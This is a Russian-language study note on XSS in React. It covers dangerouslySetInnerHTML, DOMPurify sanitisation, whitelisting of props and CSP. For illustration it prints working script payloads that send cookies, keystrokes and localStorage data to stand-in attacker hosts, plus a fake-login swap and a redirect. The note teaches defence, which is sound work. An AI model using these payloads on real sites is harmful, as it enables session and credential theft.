# Security (XSS on React props, dangerouslySetInnerHTML)

## Что такое XSS атаки

XSS атаки - атаки путем внедрения кода. По умолчанию, если мы вставляем текст между тегами в React, это делать безопасно, потому что он вставляется как текстовый узел.

## dangerouslySetInnerHTML

Но иногда нам надо воспользоваться `dangerouslySetInnerHTML` чтобы вставить готовый кусок HTML. Я так юзаю для хендлинга тегов типа `<mark>` и `<bold>`.

Но такой метод небезопасный, потому надо использовать различные библиотеки для очистки кода перед вставкой типа `dompurify`. Они чистят HTML от опасных тегов. Юзать её надо и на бэке и на фронте, потому что и с бэка может прийти:

```ts
{
  "title": "Обычный пост",
  "content": "<script>fetch('evil.com', {method:'POST', body: document.cookie})</script>"
}
```

## Основные опасности

### 1. Кража данных пользователя:
```ts
// Злоумышленник вводит в комментарий:
const maliciousInput = `
<script>
  // Отправляет все cookies на сервер злоумышленника
  fetch('https://evil-site.com/steal', {
    method: 'POST', 
    body: document.cookie
  })
</script>
`

// Если вставить без санитизации:
<div dangerouslySetInnerHTML={{__html: maliciousInput}} />
// → Все cookies (включая токены авторизации) утекут!
```

### 2. Перехват пользовательского ввода:
```ts
const keylogger = `
<script>
  document.addEventListener('keydown', (e) => {
    // Отправляет все нажатия клавиш (пароли, данные карт)
    fetch('https://evil-site.com/keys', {
      method: 'POST',
      body: e.key
    })
  })
</script>
`
```

### 3. Фишинг
```ts
const phishing = `
<script>
  // Заменяет форму входа на поддельную
  document.querySelector('#login-form').innerHTML = \`
    <form action="https://evil-site.com/fake-login">
      <input type="email" placeholder="Email">
      <input type="password" placeholder="Пароль"> 
      <button>Войти</button>
    </form>
  \`
</script>
`
```

### 4. Редирект на вредоносный сайт
```ts
const redirect = `<script>window.location = 'https://malware-site.com'</script>`
```

### 5. Кража localStorage/sessionStorage:
```ts
const dataTheft = `
<script>
  // Ворует все данные из localStorage
  fetch('https://evil-site.com/data', {
    method: 'POST',
    body: JSON.stringify({
      localStorage: {...localStorage},
      sessionStorage: {...sessionStorage}
    })
  })
</script>
`
```

## XSS on React props

XSS on React props - это вставка кода через пропсы React компонентов. Например `href`, `style` или `src` в теге `iframe` и другие варианты. Лечится путем валидации полей с помощью белых списков. Пропускать `href` только если начинается с `http` и `https` например, ну или пропускать только нужные стили, если заполнение этих атрибутов допускается пользователями.

От большинства уязвимостей браузеры защищают, но не от всех. В некоторых тегах JS валиден, поэтому надо защищаться самому.

## Защита через CSP

Ну и конечно защита через CSP. Тег `meta` и атрибуты. Разрешает загрузку только из определенных источников. Можно запретить inline скрипты. Но это не панацея, потому что не всегда атаки идут с помощью скриптов, ну их тоже обойти можно.

```html
<!-- В HTML -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' https://trusted-cdn.com">

<!-- Или HTTP заголовок -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

